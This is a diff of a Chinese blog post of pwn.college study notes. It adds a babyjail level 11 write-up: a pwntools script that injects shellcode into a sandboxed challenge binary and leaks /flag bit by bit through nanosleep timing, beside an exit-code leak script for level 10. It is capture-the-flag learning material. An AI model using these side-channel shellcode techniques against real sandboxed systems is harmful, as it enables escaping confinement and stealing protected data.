@@ -18,7 +18,7 @@
   
     <meta name="description" content="冲">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn.college各modules的一点笔记">
+<meta property="og:title" content="pwn modules的一点笔记">
 <meta property="og:url" content="https://yogdzewa.github.io/2022-01/Now-pwn-modules/index.html">
 <meta property="og:site_name" content="Yogdzewa">
 <meta property="og:description" content="冲">
@@ -26,14 +26,14 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/photo_2018-01-13_11-28-32.jpg">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-06T11:55:20.832Z">
+<meta property="article:modified_time" content="2022-04-07T01:37:01.309Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
   
   
-  <title>pwn.college各modules的一点笔记 - Yogdzewa</title>
+  <title>pwn modules的一点笔记 - Yogdzewa</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -191,7 +191,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="pwn.college各modules的一点笔记">
+            <span class="h2" id="subtitle" title="pwn modules的一点笔记">
               
             </span>
 
@@ -212,7 +212,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      38k 字
+      40k 字
     </span>
   
 
@@ -221,7 +221,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      478 分钟
+      495 分钟
     </span>
   
 
@@ -258,11 +258,11 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">pwn.college各modules的一点笔记</h1>
+            <h1 style="display: none">pwn modules的一点笔记</h1>
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年4月6日 晚上
+                  不可视境界线最后变动于：2022年4月7日 上午
                 
               </p>
             
@@ -1077,7 +1077,21 @@
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/babyjail_level10&quot;</span><br>context.binary = binary<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    shellcode =  <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100&#x27;</span><br>    shellcode += shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>    shellcode += <span class="hljs-string">&#x27;mov r10, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\n&#x27;</span><br>    shellcode += shellcraft.amd64.exit(<span class="hljs-string">&#x27;r10&#x27;</span>)<br>    payload = asm(shellcode)<br>    p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>    p.sendline(payload)<br>    exitCode = p.poll(<span class="hljs-number">1</span>)                                   <br>    ans += <span class="hljs-built_in">chr</span>(exitCode)<br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure>
 
+<h3 id="11-nanosleep"><a href="#11-nanosleep" class="headerlink" title="11.nanosleep"></a>11.nanosleep</h3><blockquote>
+<p>这下子真的是1bit1bit的收集数据了</p>
+</blockquote>
+<p>遇到的几个问题:</p>
+<ul>
+<li>偶然会发生broken tube, 不知原因.</li>
+<li>在pwn.college机子上timespec结构体两个成员都是<strong>八字节(包括long)</strong> </li>
+<li>被网上抄来的32位程序nasm坑了一把, 现在是64位gas, 基本全改了……….</li>
+<li>setnz是思维导图里看到突然想起来能用的. 以前整得笔记还不错.</li>
+<li>直接使用label地址会有重定位条目, 必须使用rip来加上标签的偏移来在运行时确定准确的地址.</li>
+<li>加载地址请用lea……line 15卡了十几分钟…..</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>bck1 = <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100\n&#x27;</span>+shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)+<span class="hljs-string">&#x27;xor rcx, rcx\n&#x27;</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    setnz cl</span><br><span class="hljs-string">    sal ecx, 4</span><br><span class="hljs-string">    mov [rip+tv_usec+3], cl</span><br><span class="hljs-string">    mov rax, 35</span><br><span class="hljs-string">    lea rdi, [rip+timeval]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //经典非法指令,至少让我知道shellcode执行正常</span><br><span class="hljs-string">    .ascii &quot;\x0f\x04&quot; </span><br><span class="hljs-string">    timeval:</span><br><span class="hljs-string">    tv_sec:  .8byte 0</span><br><span class="hljs-string">    tv_usec: .8byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    char = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sc = bck1 <span class="hljs-comment">#这个就是对read的一个封装</span><br>        <span class="hljs-comment">#下面这个是取出一字节, 然后测试第j位是否为1</span><br>        sc += <span class="hljs-string">&#x27;mov cl, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\ntest cl,&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-number">1</span>&lt;&lt;j)+<span class="hljs-string">&#x27;\n&#x27;</span><br>        sc += bck2	<br><span class="hljs-comment">#上面这个是nanosleep的调用封装,秒数由j位移位赋值到timespec结构体中第二个成员的第四个字节</span><br><span class="hljs-comment">#(从最低位开始, 因为是小端法存储),结果是268,435,456(1 0000|00000000|00000000|00000000)ns</span><br><span class="hljs-comment">#无sleep大概是0.05s,所以分界点为0.2s</span><br>        payload = asm(sc)<br>        start = time.time()<br>        p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>        p.sendline(payload)<br>        p.wait()<br>        end = time.time()<br>        elapse = end - start<br>        <span class="hljs-keyword">if</span> elapse &gt; <span class="hljs-number">0.2</span>:<br>            char |= <span class="hljs-number">1</span>&lt;&lt;j<br>    <span class="hljs-comment">#end for bits loop</span><br>    ans += <span class="hljs-built_in">chr</span>(char)<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure>
 
+<h3 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h3>
             </div>
             <hr>
             <div>
